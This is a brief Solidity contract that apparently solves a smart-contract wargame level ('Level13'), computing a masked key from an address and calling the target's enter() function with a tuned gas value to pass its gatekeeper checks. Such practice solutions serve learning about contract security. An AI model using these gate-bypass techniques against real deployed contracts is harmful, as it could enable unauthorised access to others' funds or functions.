// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./Level13.sol";

contract AttackerLevel13 {

  address public owner;
  Level13 level13;

  constructor(address _target) {
    level13 = Level13(_target);
  }


  function attack(bytes8 addr) public {
    //Solve that in Solidity 0..0
    //bytes8 key2 = bytes8(uint64(msg.sender) & 0xFFFFFFFF0000FFFF);
    bytes8 key = addr & 0xFFFFFFFF0000FFFF;
    level13.enter{gas: 8191 * 2 + 268 wei}(key);
  }
}